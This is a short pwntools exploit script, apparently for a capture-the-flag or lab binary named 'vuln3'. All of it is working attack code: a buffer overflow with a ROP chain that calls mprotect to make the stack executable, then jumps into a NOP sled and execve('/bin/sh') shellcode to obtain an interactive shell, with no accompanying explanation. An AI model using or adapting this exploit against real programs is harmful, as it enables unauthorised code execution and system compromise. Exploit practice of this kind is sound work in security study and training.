from pwn import *

elf = context.binary = ELF('./vuln3')
p =process()


pop_rdi = p64(0x00000000004018ca)
pop_rsi = p64(0x000000000040f44e)
pop_rdx = p64(0x00000000004017cf)
stack_address = p64(0x00007ffffffde000)
stack_size = p64(0x21000)
rwx = p64(0x7)
mprotect = p64(0x451bf0)
nops = b'\x90'*100
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
return_address = p64(0x7fffffffe314)
offset = b'A'*150

payload = flat(
        nops,
        shellcode,
        offset,
        pop_rdi,
        stack_address,
        pop_rsi,
        stack_size,
        pop_rdx,
        rwx,
        mprotect,
        return_address,
)

p.sendline(payload)
p.interactive()
